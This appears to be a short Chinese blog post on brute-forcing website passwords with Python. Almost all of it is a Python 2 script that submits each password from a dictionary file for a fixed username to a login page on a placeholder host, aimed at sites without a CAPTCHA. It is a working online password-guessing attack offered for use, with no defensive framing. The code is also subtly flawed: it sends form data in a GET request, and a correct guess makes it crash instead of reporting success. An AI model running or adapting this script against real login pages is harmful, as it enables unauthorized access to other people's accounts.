# 使用python进行密码暴力破解

根据字典文件,使用python进行暴力破解,程序很简单

注：针对没有验证码的情况

实例代码：

    
    
    #encoding=utf-8
    import httplib,urllib
    conn = httplib.HTTPConnection("www.xxx.cn")
    f=open("dict.txt")
    while 1:
        pwd=f.readline().strip()
        if not pwd:
            print '字典已比对完。'
            break
        params = urllib.urlencode({'username': 'xxx', 'mod': '', 'password': pwd})
        headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
        conn.request("GET", "/login/aaa.asp", params, headers)
        r = conn.getresponse()
        print r.status, r.reason
        data1 = r.read().decode('gbk')#编码根据实际情况酌情处理
        print data1.index(u'您输入的密码有误'),'您输入的密码\'%s\'有误'%pwd
    conn.close()

  

